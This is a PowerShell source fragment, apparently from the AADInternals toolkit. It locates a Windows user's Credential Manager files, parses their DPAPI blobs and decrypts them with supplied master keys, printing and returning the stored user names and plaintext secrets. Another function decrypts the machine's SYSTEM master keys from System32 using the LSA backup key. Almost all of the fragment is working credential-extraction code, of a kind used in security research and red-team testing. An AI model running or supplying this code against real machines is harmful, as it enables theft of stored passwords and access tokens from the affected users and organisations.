    param(
        [Parameter(Mandatory=$true)]
        [String]$UserName,
        [Parameter(Mandatory=$true)]
        [System.Collections.Hashtable]$MasterKeys,
        [Parameter(Mandatory=$false)]
        [String]$UsersFolder="C:\Users"
    )
    Process
    {
        $retVal=@()
        
        $localPath =   "$UsersFolder\$userName\AppData\Local\Microsoft\Credentials"
        $roamingPath = "$UsersFolder\$userName\AppData\Roaming\Microsoft\Credentials"

        $localNames =   Get-ChildItem -Path $localPath   -Hidden | select -ExpandProperty Name
        $roamingNames = Get-ChildItem -Path $roamingPath -Hidden | select -ExpandProperty Name
        
        # Get the local credentials
        foreach($fileName in $localNames)
        {
            
            Write-Verbose "Found credentials file: $("$localPath\$fileName")`n`n"
            $binCredentials = Get-Content "$localPath\$fileName" -Encoding Byte

            $retVal += Parse-CredentialsBlob -Data $binCredentials -MasterKeys $MasterKeys
        }

        # Get the roaming credentials
        foreach($fileName in $roamingNames)
        {
            
            Write-Verbose "Found credentials file: $("$roamingPath\$fileName")`n`n"
            $binCredentials = Get-Content "$roamingPath\$fileName" -Encoding Byte

            $retVal += Parse-CredentialsBlob -Data $binCredentials -MasterKeys $MasterKeys
        }

        return $retVal

    }
}


# Parses the given credentials blob with 
# Apr 28th 2020
function Parse-CredentialsBlob
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data,
        [Parameter(Mandatory=$true)]
        [System.Collections.Hashtable]$MasterKeys
    )
    Begin
    {
        $persistenceTxt = @("none", "session", "local_machine", "enterprise");
    }
    Process
    {
        # Parse and decrypt the DPAPI blob
        $DPAPIBlob = Parse-DPAPIBlob -Data $Data[12..$($data.Length)]

        # Get the masterkey guid from DPAPI blob
        $mkGuid = $DPAPIBlob.MasterKeyGuid

        # Get the correct masterkey
        $masterKey = $MasterKeys[$mkGuid]

        if(!$masterKey)
        {
            Write-Error "DPAPI masterkey $mkGuid not found!"
            return $null
        }

        # Decrypt the credentials blob
        $cBlob = Decrypt-DPAPIBlob -Data $DPAPIBlob.EncryptedData -MasterKey $masterKey -Salt $DPAPIBlob.Salt

        if($cBlob)
        {

            Write-Verbose "Decrypted Data: $(Convert-ByteArrayToHex -Bytes $cBlob)`n`n"

            # 
            # Parse the credentials blob
            $p=0
            $crFlags =  [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $crSize =   [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $crUnk0 =   [System.BitConverter]::ToInt32($cBlob,$p);$p+=4

            $type =     [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $flags =    [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $Time =     [datetime]::FromFileTimeUtc([System.BitConverter]::ToInt64($cBlob,$p));$p+=8
            $unk0 =     [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $persist =  [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $atCount =  [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $unk1 =     [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $unk2 =     [System.BitConverter]::ToInt32($cBlob,$p);$p+=4

            $tgLen =    [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $target =   ([text.encoding]::Unicode.GetString($cBlob[$p..$($p+$tgLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$tgLen

            $alLen =    [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $alias =    ([text.encoding]::Unicode.GetString($cBlob[$p..$($p+$alLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$alLen

            $cmLen =    [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $comment =  ([text.encoding]::Unicode.GetString($cBlob[$p..$($p+$cmLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$cmLen

            $ukLen =    [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $unkData =  ([text.encoding]::Unicode.GetString($cBlob[$p..$($p+$ukLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$ukLen

            $usLen =    [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $userName = ([text.encoding]::Unicode.GetString($cBlob[$p..$($p+$usLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$usLen

            $cbLen =    [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
            $crData =   [byte[]]$cBlob[$p..($p+$cbLen-1)];$p+=$cbLen

            $crDataTxt =     [text.encoding]::Unicode.GetString($crData).trim(@(0x00,0x0a,0x0d))
            $crDataTxtUtf8 = [text.encoding]::UTF8.GetString($crData).trim(@(0x00,0x0a,0x0d))
        
            $crAttrs=@{}

            for($a = 0 ; $a -lt $atCount)
            {
                $atFlag =  [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
                $kwLen =   [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
                $keyWord = ([text.encoding]::Unicode.GetString($cBlob[$p..$($p+$kwLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$kwLen

                $vaLen =   [System.BitConverter]::ToInt32($cBlob,$p);$p+=4
                $value =   ([text.encoding]::Unicode.GetString($cBlob[$p..$($p+$vaLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$vaLen
            
                $crAttrs[$keyWord]=$value
            }

            Write-Verbose "***CREDENTIALS BLOB***"
            Write-Verbose "Target:        $target"
            Write-Verbose "Last Written:  $time"
            Write-Verbose "Persistence:   $($persistenceTxt[$persist])"
            Write-Verbose "Alias:         $alias"
            Write-Verbose "Comment:       $comment"
            Write-Verbose "User name:     $userName"
            Write-Verbose "Secret:        $(Convert-ByteArrayToHex -Bytes $crData)"
            Write-Verbose "SecretTxt:     $crDataTxt"
            Write-Verbose "SecretTxtUtf8: $crDataTxtUtf8"
            Write-Verbose "Attributes:    $crAttrs`n`n`n"
        
        

            # Create a return object
            $attributes = [ordered]@{
                "Target" =        $target
                "Persistance" =   $persistenceTxt[$persist]
                "Edited" =        $time
                "Alias" =         $alias
                "Comment" =       $comment
                "UserName" =      $userName
                "Secret" =        $crData
                "SecretTxt" =     $crDataTxt
                "SecretTxtUtf8" = $crDataTxtUtf8
                "Attributes" =    $crAttrs
                }

                
            return New-Object PSObject -Property $attributes
        }
        else
        {
            Write-Error "Could not decrypt the DPAPI blob."
            return $null
        }
    }
}

# Parses the given DPAPI blob
# Apr 28th 2020
function Parse-DPAPIBlob
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )
    Process
    {
        # Parse the DPAPIBlob
        $p=0
        $version =     [System.BitConverter]::ToInt32($Data,0);$p+=4
        $provGuid =    [guid][byte[]]$Data[$p..($p+15)];$p+=16
        $mkVersion =   [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $mkGuid  =     [guid][byte[]]$Data[$p..($p+15)];$p+=16
        $flags =       [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $dscLen =      [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $description = ([text.encoding]::Unicode.GetString($Data[$p..$($p+$dscLen-1)])).trim(@(0x00,0x0a,0x0d)); $p+=$dscLen
        $algCrypt =    [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $algCryptLen = [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $saltLen =     [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $salt =        $Data[$p..($p+$saltLen-1)];$p+=$saltLen
        $hmacKeyLen =  [System.BitConverter]::ToInt32($Data,$p);$p+=4
        if($hmacKeyLen -gt 0) {$hmacKey =     $Data[$p..($p+$hmacKeyLen-1)];$p+=$hmacKeyLen }
        $algHash =     [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $algHashLen =  [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $hmac2KeyLen = [System.BitConverter]::ToInt32($Data,$p);$p+=4
        if($hmac2KeyLen -gt 0) {$hmac2Key =    $Data[$p..($p+$hmac2KeyLen-1)];$p+=$hmac2KeyLen}
        $encDataLen =  [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $encData =     $Data[$p..($p+$encDataLen-1)];$p+=$encDataLen
        $signLen =     [System.BitConverter]::ToInt32($Data,$p);$p+=4
        $signature =   $Data[$p..($p+$signLen-1)]

        Write-Verbose "***DPAPIBLOB***"
        Write-Verbose "Provider GUID:  $provGuid"
        Write-Verbose "Masterkey GUID: $mkGuid"
        Write-Verbose "Description:    $description"
        Write-Verbose "Hash Alg:       $algHash $($ALGS[$algHash])"
        Write-Verbose "Crypt Alg:      $algCrypt $($ALGS[$algCrypt])"
        if($hmacKey) { Write-Verbose "HMAC key:       $(Convert-ByteArrayToHex -Bytes $hmacKey)"}
        if($hmac2Key) { Write-Verbose "HMAC key2:      $(Convert-ByteArrayToHex -Bytes $hmac2Key)"}
        Write-Verbose "Salt:           $(Convert-ByteArrayToHex -Bytes $salt)"
        Write-Verbose "Encrypted Data: $(Convert-ByteArrayToHex -Bytes $encData)"
        Write-Verbose "Signature:      $(Convert-ByteArrayToHex -Bytes $signature)`n`n"

        # Create a return object
        $attributes = [ordered]@{
                "ProviderGuid" =  $provGuid
                "MasterKeyGuid" = $mkGuid
                "Description" =   $description
                "HashAlg" =       $algHash
                "CryptAlg" =      $algCrypt
                "Salt" =          $salt
                "EncryptedData" = $encData
                "Signature" =     $signature
                "HMACKey" =       $hmacKey
                "HMACKey2" =      $hmac2Key
                }

                
        return New-Object PSObject -Property $attributes
    }
}

# Decrypts the DPAPI secret using the given masterkey and salt
# Apr 29th 2020
function Decrypt-DPAPIBlob
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data,
        [Parameter(Mandatory=$true)]
        [byte[]]$MasterKey,
        [Parameter(Mandatory=$true)]
        [byte[]]$Salt
    )
    Process
    {
        # Decrypt the DPAPI blob with the given masterkey and salt
        $decData = [AADInternals.Native]::getDPAPIBlob($MasterKey,$Data,$salt)

        return $decData
    }
}

# Gets the system masterkeys
# Apr 29th 2020
function Get-SystemMasterkeys
{
    <#
    .SYNOPSIS
    Gets local system master keys

    .DESCRIPTION
    Gets local system master keys with the givne system backup key (LSA backup key)

    $lsabk_keys=Get-AADIntLSABackupKeys
    PS C:\>$rsa_key=$lsabk_keys | where name -eq RSA

    PS C:\>Get-AADIntSystemMasterkeys -SystemKey $rsa_key.key
    
    Name                           Value
    ----                           -----
    ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}

#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$SystemKey
    )
    Process
    {
        
        $keysPath="$env:windir\System32\Microsoft\Protect\S-1-5-18"

        # Get the preferred masterkey guid
        $preferredFile = Get-Content "$keysPath\Preferred" -Encoding Byte
        $masterKeyGuid = ([guid][byte[]]$preferredFile[0..15]).ToString()
        $TimeStamp =     [datetime]::FromFileTimeUtc([System.BitConverter]::ToInt64($preferredFile,16))
        Write-Verbose "Preferred key: $masterKeyGuid, valid until: $TimeStamp"


        # Get the preferred masterkey
        $fileName = "$keysPath\$($masterKeyGuid.ToString())"
        Write-Verbose "Opening masterkey file: $fileName`n`n"
        $binMasterKey = Get-Content $fileName -Encoding Byte

        # Parse the masterkey blob
        $mk = Parse-MasterkeyBlob -Data $binMasterKey

        $decKey = Decrypt-MasterkeyBlob -Systemkey $systemKey -Data $mk.DomainKey 

        $retVal = @{$mk.MasterKeyGuid = $decKey}
        
        return $retVal

    }
}